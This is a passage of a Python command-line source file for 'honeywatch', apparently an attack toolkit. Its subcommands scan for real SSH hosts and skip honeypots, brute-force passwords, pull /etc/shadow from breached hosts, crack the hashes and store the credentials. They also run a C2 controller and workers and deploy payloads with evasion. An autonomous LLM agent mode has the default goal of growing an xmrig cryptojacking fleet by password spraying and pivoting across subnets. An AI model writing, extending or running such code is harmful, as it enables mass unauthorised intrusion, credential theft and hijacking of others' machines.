    out = args.out
    stamp = time.strftime("%Y%m%d-%H%M%S")
    if out is None:
        out_dir = getattr(cfg.storage, "reports_dir", "reports")
        os.makedirs(out_dir, exist_ok=True)
        out = os.path.join(out_dir, f"report-{stamp}.{args.format}")
    elif os.path.isdir(out):
        out = os.path.join(out, f"report-{stamp}.{args.format}")

    writer = {"json": write_json, "csv": write_csv, "md": write_md}[args.format]
    result = writer(out, rows)
    # Defensive: if a writer returns the rendered content instead of writing
    # the file itself, write it for the user.
    if isinstance(result, str) and result and not os.path.exists(out):
        with open(out, "w", encoding="utf-8") as fh:
            fh.write(result)
    print(f"wrote {len(rows)} score rows to {out}")
    return 0


def _cmd_scan(args, argv) -> int:
    from honeywatch.config import load_config
    from honeywatch.pipeline import Pipeline
    from honeywatch.report import write_csv, write_json, write_md
    from honeywatch.store import Store

    cfg = load_config(args.config)
    _apply_scan_options(cfg, args, argv)

    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2

    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    out_dir = args.out_dir or getattr(cfg.storage, "reports_dir", "reports")

    rate = args.rate
    if rate is None:
        tool_cfg = getattr(cfg.scanners, args.tool, None)
        rate = getattr(tool_cfg, "rate", None) if tool_cfg is not None else None
        if rate is None:
            rate = getattr(getattr(cfg.scanners, "masscan", None), "rate", 1000)

    ports = parse_ports(args.ports)
    store = Store(db_path)

    def run_once():
        pipeline = Pipeline(cfg, store=store)
        scores = _maybe_await(
            _call_scan(pipeline, cfg, args, argv, args.targets, args.tool, ports, rate)
        ) or []
        if scores:
            try:
                store.upsert_scores(scores)
            except Exception as exc:  # storage failure should not kill the scan
                print(f"honeywatch: warning: could not update store: {exc}", file=sys.stderr)
            os.makedirs(out_dir, exist_ok=True)
            stamp = time.strftime("%Y%m%d-%H%M%S")
            base = os.path.join(out_dir, f"scan-{stamp}")
            writers = {"json": write_json, "csv": write_csv, "md": write_md}
            requested = args.report_format or ["json", "csv", "md"]
            formats = []
            for value in requested:
                formats.extend(p.strip() for p in value.split(","))
            formats = [f for f in formats if f in writers] or ["json", "csv", "md"]
            for ext in formats:
                try:
                    writers[ext](f"{base}.{ext}", scores)
                except Exception as exc:
                    print(
                        f"honeywatch: warning: could not write {base}.{ext}: {exc}",
                        file=sys.stderr,
                    )
            print(f"reports written to {out_dir} (scan-{stamp}.*)")
        else:
            print("scan returned no scored hosts.")
        print_summary(scores)
        return scores

    print(
        f"scanning {len(args.targets)} target(s) on ports {','.join(map(str, ports))} "
        f"with {args.tool} (rate={rate})"
    )
    while True:
        try:
            run_once()
        except Exception as exc:
            # A transient scanner/probe failure should not kill an --interval
            # loop; log and try again on the next tick. A single-shot run
            # still surfaces the failure as a non-zero exit.
            print(
                f"honeywatch: error: scan iteration failed: {exc}",
                file=sys.stderr,
            )
            if args.interval is None:
                return 1
        if args.interval is None:
            break
        print(f"[interval] next scan in {args.interval}s - Ctrl-C to stop")
        time.sleep(args.interval)
    return 0


def _apply_scan_options(cfg, args, argv) -> None:
    """Fold CLI scan options into the config so config-driven modules see them."""
    if args.concurrency is not None:
        _set(cfg.probe, "concurrency", args.concurrency)
    if args.timeout is not None:
        _set(cfg.probe, "timeout_s", args.timeout)
    if "--probe-level" in argv:
        _set(cfg.probe, "level", args.probe_level)
    if args.auth_probe:
        _set(cfg.probe, "auth_probe", True)
    if args.no_ai:
        _set(cfg.ai, "enabled", False)
    if args.model is not None:
        _set(cfg.ai, "model", args.model)
    if args.all_hosts:
        _set(cfg.scan, "only_ssh", False)


def _call_scan(pipeline, cfg, args, argv, targets, tool, ports, rate):
    """Invoke pipeline.scan, passing only the kwargs its signature accepts."""
    probe_cfg = getattr(cfg, "probe", None)
    ai_cfg = getattr(cfg, "ai", None)
    level = args.probe_level if "--probe-level" in argv else getattr(probe_cfg, "level", "fast")
    candidates = {
        "max_hosts": args.max_hosts,
        "concurrency": (
            args.concurrency if args.concurrency is not None else getattr(probe_cfg, "concurrency", None)
        ),
        "timeout_s": (
            args.timeout if args.timeout is not None else getattr(probe_cfg, "timeout_s", None)
        ),
        "timeout": (
            args.timeout if args.timeout is not None else getattr(probe_cfg, "timeout_s", None)
        ),
        "probe_level": level,
        "level": level,
        "auth_probe": bool(args.auth_probe or getattr(probe_cfg, "auth_probe", False)),
        "ai_enabled": (not args.no_ai) and bool(getattr(ai_cfg, "enabled", True)),
        "model": args.model or getattr(ai_cfg, "model", None),
        "skip_vpn_check": args.skip_vpn_check,
        "resume": getattr(args, "resume", False),
        "progress": getattr(args, "progress", False),
    }
    # _match_signature keeps only the kwargs this pipeline's scan() accepts,
    # so both the canonical (probe_level) and alternate (level) spellings are
    # safe to offer.
    return pipeline.scan(targets, tool, ports, rate, **_match_signature(pipeline.scan, candidates))


def _cmd_stats(args, argv) -> int:
    import json as _json
    from honeywatch.config import load_config
    from honeywatch.store import Store

    cfg = load_config(args.config)
    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    store = Store(db_path)
    stats = store.stats()
    if args.json:
        print(_json.dumps(stats, indent=2, default=str))
        return 0
    print(f"hosts:      {stats['total']}")
    print(f"known keys: {stats.get('known_keys', 0)}")
    if stats.get("by_label"):
        print("by label:")
        for label, n in sorted(stats["by_label"].items()):
            print(f"  {label:<12} {n}")
    if stats.get("by_flag"):
        print("by flag:")
        for flag, n in sorted(stats["by_flag"].items(), key=lambda kv: -kv[1]):
            print(f"  {flag:<32} {n}")
    return 0


def _parse_key_value(items: list[str]) -> dict[str, str]:
    """Parse ['k=v', 'a=b'] into a dict, ignoring malformed entries."""
    out: dict[str, str] = {}
    for item in items:
        if "=" not in item:
            continue
        key, value = item.split("=", 1)
        out[key.strip()] = value.strip()
    return out


def _cmd_c2(args, argv) -> int:
    from honeywatch.config import load_config

    cfg = load_config(args.config)
    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2

    c2_cfg = getattr(cfg, "c2", None)
    host = args.host if args.host is not None else getattr(c2_cfg, "host", "0.0.0.0")
    port = args.port if args.port is not None else getattr(c2_cfg, "port", 8443)
    db_path = args.db or getattr(getattr(cfg, "storage", None), "db", None)

    if args.generate_certs:
        from honeywatch.c2.tls import ensure_self_signed_pair

        cert, key = ensure_self_signed_pair("certs")
        print(f"generated self-signed cert: {cert}, {key}")
        if args.tls_cert is None:
            args.tls_cert = cert
        if args.tls_key is None:
            args.tls_key = key

    cert = args.tls_cert or getattr(c2_cfg, "tls_cert", None)
    key = args.tls_key or getattr(c2_cfg, "tls_key", None)
    api_token = args.api_token or getattr(c2_cfg, "api_token", None)

    from honeywatch.c2 import Controller, C2Store, build_ssl_context
    from honeywatch.c2.controller import HAS_AIOHTTP

    if not HAS_AIOHTTP:
        print(
            "honeywatch: the c2 subcommand requires the 'aiohttp' package.\n"
            "  Install it with:  pip install honeywatch[c2]",
            file=sys.stderr,
        )
        return 1

    store = C2Store(db_path)
    ssl_ctx = build_ssl_context(cert, key)
    controller = Controller(store, host=host, port=port, ssl_context=ssl_ctx,
                            api_token=api_token)
    try:
        _maybe_await(controller.run())
    except KeyboardInterrupt:
        print("\nhoneywatch c2: stopped", file=sys.stderr)
    return 0


def _cmd_worker(args, argv) -> int:
    from honeywatch.config import load_config

    cfg = load_config(args.config)
    workers_cfg = getattr(cfg, "workers", None)

    url = args.controller_url if args.controller_url is not None else getattr(
        workers_cfg, "controller_url", "http://127.0.0.1:8443"
    )
    categories = None
    if args.categories is not None:
        categories = [c.strip() for c in args.categories.split(",") if c.strip()]
    elif workers_cfg is not None:
        categories = list(getattr(workers_cfg, "categories", []))
    exec_mode = args.exec_mode if args.exec_mode is not None else getattr(
        workers_cfg, "exec_mode", "dry_run"
    )
    poll_interval = (
        args.poll_interval
        if args.poll_interval is not None
        else getattr(workers_cfg, "poll_interval", 5.0)
    )
    ssh_user = args.ssh_user if args.ssh_user is not None else getattr(
        workers_cfg, "ssh_user", "root"
    )
    ssh_key = args.ssh_key if args.ssh_key is not None else getattr(
        workers_cfg, "ssh_key", None
    )
    api_token = args.api_token or getattr(workers_cfg, "api_token", None)

    from honeywatch.c2 import Worker

    worker = Worker(
        controller_url=url,
        categories=categories,
        exec_mode=exec_mode,
        poll_interval=poll_interval,
        ssh_user=ssh_user,
        ssh_key=ssh_key,
        api_token=api_token,
    )
    print(f"honeywatch worker: connecting to {url} (categories={categories})")
    try:
        _maybe_await(worker.run())
    except KeyboardInterrupt:
        worker.stop()
        print("\nhoneywatch worker: stopped", file=sys.stderr)
    return 0


def _cmd_deploy(args, argv) -> int:
    from honeywatch.config import load_config
    from honeywatch.c2.store import C2Store
    from honeywatch.models import Target
    from honeywatch.ops import (
        TargetFilter,
        build_manifest,
        enqueue_operation,
        prepare_evasion_pipeline,
        select_targets,
    )
    from honeywatch.store import Store

    cfg = load_config(args.config)
    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2

    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    variables = _parse_key_value(args.var)

    # Gather targets.
    if args.target_file:
        targets = []
        with open(args.target_file, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                ip, port = parse_host(line)
                targets.append(
                    Target(
                        ip=ip,
                        port=port,
                        allowed_categories=[],
                        ssh_user=args.ssh_user,
                        ssh_key=args.ssh_key,
                    )
                )
    else:
        store = Store(db_path)
        labels = {args.target_label} if args.target_label else {"real", "likely_real"}
        filter_ = TargetFilter(
            labels=labels,
            min_confidence=args.min_confidence if args.min_confidence is not None else 0.7,
            max_confidence=args.max_confidence if args.max_confidence is not None else 1.0,
            limit=args.limit,
        )
        targets = select_targets(store, filter_, args.ssh_user, args.ssh_key)

    if not targets:
        print("deploy: no targets matched")
        return 0

    # Auto-fill credentials the cracker previously stored for these hosts so
    # `honeywatch crack` -> `honeywatch deploy ... --exec-mode ssh` works with
    # no extra flags. Explicit --ssh-user/--ssh-key on the CLI still win.
    if not args.ssh_user and not args.ssh_key:
        cred_store = Store(db_path)
        for target in targets:
            if target.ssh_user and target.ssh_pass:
                continue
            cred = cred_store.credential_for(target.ip, target.port)
            if not cred:
                continue
            if not target.ssh_user:
                target.ssh_user = cred.get("user")
            if not target.ssh_pass:
                target.ssh_pass = cred.get("password")

    evasion = prepare_evasion_pipeline(args.evasion)
    if not evasion and not args.evasion:
        payloads_cfg = getattr(cfg, "payloads", None)
        evasion = prepare_evasion_pipeline(
            getattr(payloads_cfg, "default_evasion", None)
        )

    # Integrity manifest: CLI --integrity wins, then config payloads.integrity_file.
    from honeywatch.payloads.integrity import load_integrity
    integrity_file = args.integrity or getattr(
        getattr(cfg, "payloads", None), "integrity_file", None
    )
    require_integrity = bool(args.require_integrity or getattr(
        getattr(cfg, "payloads", None), "require_integrity", False
    ))
    integrity_manifest = load_integrity(integrity_file)

    manifest = build_manifest(
        args.payload_id, targets, variables, evasion,
        allow_unsafe_vars=bool(args.allow_unsafe_vars),
        integrity_manifest=integrity_manifest,
        require_integrity=require_integrity,
    )

    if args.dry_run:
        print(f"payload: {manifest.payload.id} ({manifest.payload.category})")
        print(f"targets: {len(manifest.targets)}")
        print(f"evasion: {evasion}")
        print("--- sample script for first target ---")
        first_ip = manifest.targets[0].ip
        print(manifest.per_host_scripts.get(first_ip, ""))
        return 0

    if args.controller_url:
        from honeywatch.ops.deploy import dispatch_to_controller

        result = dispatch_to_controller(args.controller_url, manifest)
        print(f"deploy: enqueued operation {result.get('id')} via controller")
    else:
        c2_store = C2Store(db_path)
        op = enqueue_operation(c2_store, manifest)
        print(f"deploy: enqueued operation {op.id} with {len(targets)} task(s)")
    return 0


def _cmd_setup(args, argv) -> int:
    from honeywatch.agent.setup import (
        SetupStore,
        check_external_tools,
        offer_install_tools,
        run_setup_wizard,
    )

    # --check-tools: just report tool availability, skip the wizard.
    if getattr(args, "check_tools", False):
        tool_status = check_external_tools()
        for t in tool_status:
            status = "[ok]" if t["available"] else "[--]"
            print(f"  {status} {t['name']}")
        missing = [t for t in tool_status if not t["available"]]
        if missing:
            print(f"\n{len(missing)} tool(s) missing -- install with:")
            for t in missing:
                print(f"  {t.get('apt', '')}")
        else:
            print("\nall external tools found.")
        return 0

    non_interactive = {}
    if args.ollama_api_key is not None:
        non_interactive["ollama_api_key"] = args.ollama_api_key
    if args.ollama_base_url is not None:
        non_interactive["ollama_base_url"] = args.ollama_base_url
    if args.ollama_model is not None:
        non_interactive["ollama_model"] = args.ollama_model
    if args.pool is not None:
        non_interactive["pool"] = args.pool
    if args.wallet is not None:
        non_interactive["wallet"] = args.wallet
    if args.pass_ is not None:
        non_interactive["pass"] = args.pass_
    if args.worker is not None:
        non_interactive["worker"] = args.worker
    if args.tls:
        non_interactive["tls"] = "true"

    store = SetupStore(args.db)
    run_setup_wizard(
        store=store,
        db_path=args.db,
        non_interactive=non_interactive if non_interactive else None,
    )
    print(f"setup saved to {args.db}")
    return 0


def _cmd_chat(args, argv) -> int:
    from honeywatch.cli_chat import TerminalUI

    ui = TerminalUI(
        db_path=args.db,
        config_path=getattr(args, "config", None),
        skip_vpn_check=args.skip_vpn_check,
    )
    if args.prompt:
        # Single-prompt mode: init agent, run one round, print result.
        ui._init_agent()
        if ui.agent is None:
            return 1
        try:
            response = ui.agent.chat(args.prompt)
            print(response)
        except Exception as exc:
            print(f"honeywatch: error: {exc!r}", file=sys.stderr)
            return 1
        return 0
    return ui.run()


def _cmd_agent(args, argv) -> int:
    """Autonomous self-driving agent loop -- no human at the keyboard."""
    import json as _json
    import os

    from honeywatch.agent.ollama_agent import ChatAgent

    log_fh = None
    if args.log:
        log_dir = os.path.dirname(os.path.abspath(args.log))
        os.makedirs(log_dir, exist_ok=True)
        log_fh = open(args.log, "a", encoding="utf-8")

    def _log(line: str) -> None:
        print(line, flush=True)
        if log_fh:
            log_fh.write(line + "\n")
            log_fh.flush()

    def on_say(text: str) -> None:
        _log(text)

    def on_tool_running(name: str) -> None:
        _log(f"  -> running {name}...")

    def on_tool_result(name: str, result: dict) -> None:
        _log(f"  [{name}] " + _json.dumps(result, default=str, ensure_ascii=False)[:300])

    agent = ChatAgent(
        db_path=args.db,
        skip_vpn_check=args.skip_vpn_check,
        autonomous=True,
        on_say=on_say,
        on_tool_running=on_tool_running,
        on_tool_result=on_tool_result,
    )
    goal = args.goal or (
        "Grow the xmrig cryptojacker fleet autonomously: discover real SSH hosts, "
        "spray passwords, crack /etc/shadow, deploy xmrig, and pivot to adjacent "
        "subnets. Reuse recovered credentials across the fleet."
    )
    print(f"honeywatch agent: autonomous mode (model={agent.config.ollama_model})")
    print(f"  goal: {goal}")
    print(f"  max-cycles: {args.max_cycles} (0 = forever)  business-hours: {args.business_hours}")
    if log_fh:
        print(f"  log: {args.log}")
    # Pre-flight: verify Ollama is reachable. Wasting all max_cycles on
    # connection errors is pointless; fail early with a clear message.
    if not agent.client.is_reachable():
        print(
            f"honeywatch: cannot reach Ollama at {agent.config.ollama_base_url}. "
            "Check that Ollama is running and your API key is correct.",
            file=sys.stderr,
        )
        if log_fh:
            log_fh.close()
        return 1
    print("-" * 60)
    try:
        summary = agent.run_autonomous(
            goal=goal,
            max_cycles=args.max_cycles,
            cycle_delay=args.cycle_delay,
            business_hours=args.business_hours,
        )
    finally:
        # Close the log handle on every path -- a raised exception or Ctrl-C
        # during the autonomous loop must not leak the open file descriptor.
        if log_fh:
            log_fh.close()
    if args.json:
        print(_json.dumps(summary, indent=2, default=str))
    else:
        print("\n" + "-" * 60)
        print("agent run complete")
        print(f"  cycles:      {summary['cycles']}")
        print(f"  tool_calls:  {summary['tool_calls']}")
        print(f"  done:        {summary['done']}")
        print(f"  stop_reason: {summary['stop_reason']}")
    return 0



def _cmd_crack(args, argv) -> int:
    import json as _json

    from honeywatch.config import load_config
    from honeywatch.crack import CrackTarget, crack_targets, load_wordlist
    from honeywatch.store import Store

    cfg = load_config(args.config)
    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2

    crack_cfg = getattr(cfg, "crack", None)
    concurrency = args.concurrency or getattr(crack_cfg, "concurrency", 8)
    host_concurrency = args.host_concurrency or getattr(crack_cfg, "host_concurrency", 32)
    timeout_s = args.timeout if args.timeout is not None else getattr(crack_cfg, "timeout_s", 6.0)
    max_attempts = (
        args.max_attempts if args.max_attempts is not None
        else getattr(crack_cfg, "max_attempts", None)
    )
    mutations = (not args.no_mutations) and bool(getattr(crack_cfg, "mutations", True))
    save_credentials = (not args.no_save) and bool(getattr(crack_cfg, "save_credentials", True))

    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    store = Store(db_path)

    users: list[str] = []
    if args.user:
        users = [args.user]
    elif args.users:
        users = [u.strip() for u in args.users.split(",") if u.strip()]

    passwords: list[str] = []
    if args.passwords:
        passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]

    wordlist: list[str] | None = None
    if args.wordlist:
        wordlist = load_wordlist(args.wordlist)
        if not wordlist:
            print(
                "honeywatch: warning: wordlist " + repr(args.wordlist)
                + " unreadable or empty; using built-ins only",
                file=sys.stderr,
            )
    else:
        # Default to the bundled wordlist so crack works out of the box.
        from honeywatch.crack import default_wordlist_path
        wordlist = load_wordlist(default_wordlist_path())

    hosts: list[tuple[str, int]] = []
    if args.targets:
        for spec in args.targets:
            ip, port = parse_host(spec)
            hosts.append((ip, port))
    if args.target_file:
        with open(args.target_file, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                ip, port = parse_host(line)
                hosts.append((ip, port))
    if not hosts and (args.target_label or args.min_confidence is not None):
        rows = store.query(
            limit=args.limit or 1000,
            label=args.target_label,
            min_confidence=args.min_confidence or 0.0,
        )
        for row in rows:
            hosts.append((row["ip"], int(row["port"])))
    if not hosts:
        print("crack: no targets. Pass hosts, --target-file, or --target-label/--min-confidence.")
        return 0

    seen: set[tuple[str, int]] = set()
    unique_hosts: list[tuple[str, int]] = []
    for ip, port in hosts:
        key = (ip, port)
        if key not in seen:
            seen.add(key)
            unique_hosts.append(key)
    hosts = unique_hosts

    targets = [
        CrackTarget(
            ip=ip,
            port=port,
            users=list(users),
            passwords=list(passwords),
            wordlist=wordlist,
            mutations=mutations,
            max_attempts=max_attempts,
            timeout_s=timeout_s,
            stop_on_success=not args.no_stop_on_success,
        )
        for ip, port in hosts
    ]

    print(
        "cracking " + str(len(targets)) + " host(s): concurrency=" + str(concurrency)
        + "/host host_concurrency=" + str(host_concurrency) + " timeout=" + str(timeout_s) + "s"
    )

    def on_attempt(attempt, result):
        mark = "+" if attempt.success else "-"
        if not args.json:
            masked = "*" * len(attempt.password)
            print("  [" + mark + "] " + result.ip + ":" + str(result.port)
                  + " " + attempt.user + ":" + masked, flush=True)

    results = _maybe_await(
        crack_targets(
            targets,
            concurrency=concurrency,
            host_concurrency=host_concurrency,
            on_attempt=on_attempt,
        )
    )

    if save_credentials:
        for res in results:
            if res.success:
                store.upsert_credential(
                    res.ip, res.port, res.user or "", res.password,
                    banner=res.banner, attempts=res.attempts, source="crack",
                )

    if args.json:
        print(_json.dumps([r.credential() for r in results], indent=2, default=str))
        return 0

    wins = [r for r in results if r.success]
    print("\ncrack summary")
    print("  hosts:      " + str(len(results)))
    print("  successes:  " + str(len(wins)))
    print("  attempts:   " + str(sum(r.attempts for r in results)))
    if wins:
        print("\ncredentials:")
        for r in wins:
            print("  " + r.ip + ":" + str(r.port) + "  " + str(r.user) + ":" + str(r.password))
    else:
        print("\nno credentials recovered.")
    return 0


def _cmd_creds(args, argv) -> int:
    import json as _json

    from honeywatch.config import load_config
    from honeywatch.store import Store

    cfg = load_config(args.config)
    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    store = Store(db_path)
    rows = store.query_credentials(
        ip=args.ip, port=args.port, user=args.user, limit=args.limit
    )
    if args.json:
        print(_json.dumps(rows, indent=2, default=str))
        return 0
    if not rows:
        print("no stored credentials.")
        return 0
    print("{:<28} {:<14} {:<24} {:<9} {}".format(
        "host", "user", "password", "attempts", "discovered"))
    for r in rows:
        host = str(r.get("ip")) + ":" + str(r.get("port"))
        print("{:<28} {:<14} {:<24} {:<9} {}".format(
            host, r.get("user") or "", r.get("password") or "",
            r.get("attempts", 0), r.get("discovered_at") or ""))
    return 0


def _cmd_hashcrack(args, argv) -> int:
    import json as _json
    import shlex as _shlex

    from honeywatch.config import load_config
    from honeywatch.hashcrack import crack_shadow, parse_shadow
    from honeywatch.store import Store

    cfg = load_config(args.config)
    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")

    shadow_path = args.shadow
    # Allow pointing at a stash dir produced by `grab` (./<ip>/shadow).
    if os.path.isdir(shadow_path):
        sub = os.path.join(shadow_path, "shadow")
        if os.path.isfile(sub):
            shadow_path = sub
    if not os.path.isfile(shadow_path):
        print("hashcrack: shadow file not found: " + args.shadow)
        return 1

    wordlist = args.wordlist
    if not wordlist:
        from honeywatch.crack import default_wordlist_path
        wordlist = default_wordlist_path()
    if wordlist and not os.path.isfile(wordlist):
        print("hashcrack: wordlist not found: " + wordlist, file=sys.stderr)
        return 1

    extra = []
    if args.extra_args:
        try:
            extra = _shlex.split(args.extra_args)
        except ValueError as exc:
            print("hashcrack: bad --extra-args: " + str(exc), file=sys.stderr)
            return 1

    result = crack_shadow(
        shadow_path=shadow_path,
        wordlist=args.wordlist,
        tool=args.tool,
        passwd_path=args.passwd,
        bin_path=args.bin,
        mode=args.mode,
        extra_args=extra or None,
        timeout_s=args.timeout,
    )

    if result.error and not result.cracked:
        print("hashcrack: " + result.error, file=sys.stderr)
        if args.json:
            print(_json.dumps({"error": result.error, "tool": result.tool}, indent=2))
        return 1

    creds = result.credentials()

    # Persist recovered passwords to the store so deploy / pivot can reuse
    # them. --ip ties the credential to a host; without it we record with the
    # shadow filename as a source tag so an operator can still query by user.
    if creds and not args.no_save:
        store = Store(db_path)
        for c in creds:
            ip = args.ip or ""
            if ip:
                store.upsert_credential(
                    ip, args.port, c["user"], c["password"],
                    banner=None, attempts=1, source="hashcat" if args.tool == "hashcat" else "john",
                )

    if args.json:
        print(_json.dumps({
            "tool": result.tool,
            "wordlist": result.wordlist,
            "attempted": result.attempted,
            "cracked": len(creds),
            "error": result.error,
            "returncode": result.returncode,
            "credentials": creds,
        }, indent=2, default=str))
        return 0

    print("hashcrack summary (" + result.tool + ")")
    print("  attempted:  " + str(result.attempted))
    print("  cracked:   " + str(len(creds)))
    if result.error:
        print("  error:     " + result.error)
    if creds:
        print("\ncredentials:")
        for c in creds:
            print("  " + str(c["user"]) + ":" + str(c["password"]))
    return 0


def _cmd_grab(args, argv) -> int:
    import json as _json

    from honeywatch.config import load_config
    from honeywatch.hashcrack import grab_shadow
    from honeywatch.store import Store

    cfg = load_config(args.config)
    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2

    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    ip, port = parse_host(args.host)
    user = args.user
    passw = args.pass_

    # Auto-fill from the credentials store when the operator did not pin creds.
    if (not user or not passw) and not args.key:
        cred = Store(db_path).credential_for(ip, port)
        if cred:
            user = user or cred.get("user")
            passw = passw or cred.get("password")

    stash = args.stash or ".honeywatch/shadow_stash"
    timeout_s = args.timeout if args.timeout is not None else 10.0
    res = grab_shadow(
        ip=ip, port=port, user=user, password=passw, key_path=args.key,
        stash_dir=stash, timeout_s=timeout_s,
    )
    if args.json:
        print(_json.dumps(res, indent=2, default=str))
        return 0 if res.get("shadow_path") else 1
    if res.get("error"):
        print("grab: " + res["error"], file=sys.stderr)
        return 1
    print("grabbed shadow for " + ip + ":" + str(port))
    print("  shadow: " + str(res.get("shadow_path")))
    if res.get("passwd_path"):
        print("  passwd: " + str(res.get("passwd_path")))
    print("  next: honeywatch hashcrack " + str(res.get("shadow_path"))
          + " --wordlist <wl> --ip " + ip + " --port " + str(port))
    return 0


def print_summary(scores) -> None:
    if not scores:
        return
    counts = Counter(s.final_label for s in scores)
    print("\ncounts by final label:")
    for label, n in counts.most_common():
        print(f"  {label:<12} {n}")
    top = sorted(scores, key=lambda s: s.final_confidence, reverse=True)[:10]
    print(f"\ntop {len(top)} by confidence:")
    print(f"  {'host':<40} {'label':<12} {'confidence':>10}")
    for s in top:
        print(f"  {f'{s.ip}:{s.port}':<40} {s.final_label:<12} {s.final_confidence:>10.3f}")


# ---------------------------------------------------------------------------
# entry point
# ---------------------------------------------------------------------------

def main(argv=None) -> int:
    parser = build_parser()
    if argv is None:
        argv = sys.argv[1:]
    try:
        args = parser.parse_args(argv)
    except SystemExit as exc:
        # argparse exits with 0 for --help and 2 for usage errors.
        return 0 if exc.code is None else int(exc.code)
    try:
        return args.func(args, argv)
    except KeyboardInterrupt:
        print("\nhoneywatch: interrupted", file=sys.stderr)
        return 130
    except Exception as exc:  # keep the CLI usable on any runtime error
        print(f"honeywatch: error: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
